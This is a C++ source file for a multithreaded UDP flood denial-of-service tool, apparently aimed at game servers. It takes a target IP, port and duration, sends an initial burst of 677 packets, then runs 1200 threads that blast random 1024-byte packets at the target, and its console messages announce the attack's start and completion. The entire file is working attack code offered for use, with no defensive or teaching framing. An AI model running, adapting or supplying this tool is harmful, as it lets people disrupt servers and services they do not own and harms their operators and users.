#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>

using namespace std;

#define THREAD_COUNT 1200  // 1200 Threads for UDP Flood
#define PACKET_SIZE 1024   // Size of each UDP packet

// Function to generate a random payload
void generate_random_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

// Instant Burst of 677 UDP Packets
void instant_burst(const char *ip, int port) {
    char burst_packet[64];  // Small packet size like game ping
    generate_random_payload(burst_packet, sizeof(burst_packet));

    int burst_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (burst_sock < 0) {
        perror("Socket error");
        return;
    }

    struct sockaddr_in burst_addr;
    burst_addr.sin_family = AF_INET;
    burst_addr.sin_port = htons(port);
    burst_addr.sin_addr.s_addr = inet_addr(ip);

    cout << "\n🚀 Sending Instant Burst of 677 packets...\n";

    for (int i = 0; i < 677; i++) {
        sendto(burst_sock, burst_packet, sizeof(burst_packet), 0, (struct sockaddr *)&burst_addr, sizeof(burst_addr));
    }

    close(burst_sock);
    cout << "✅ Instant Burst Sent!\n";
}

// Function for UDP flood attack
void udp_flood(const char *ip, int port, int duration) {
    char packet[PACKET_SIZE];
    generate_random_payload(packet, PACKET_SIZE);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket error");
        return;
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);

    while (chrono::steady_clock::now() < end_time) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        cerr << "Usage: " << argv[0] << " <IP> <Port> <Duration>\n";
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    cout << "\n🔥 Game UDP Flood Attack Starting!";
    cout << "\n🎯 Target: " << target_ip << ":" << target_port;
    cout << "\n⏳ Duration: " << duration << " sec";
    cout << "\n⚡ Threads: " << THREAD_COUNT << endl;

    // Step 1: Instant Burst of 677 Packets
    instant_burst(target_ip, target_port);

    // Step 2: Multi-threaded UDP Flood
    vector<thread> threads;
    for (int i = 0; i < THREAD_COUNT; i++) {
        threads.emplace_back(udp_flood, target_ip, target_port, duration);
    }

    for (auto &t : threads) {
        t.join();
    }

    cout << "\n✅ Attack Completed!\n";
    return 0;
}
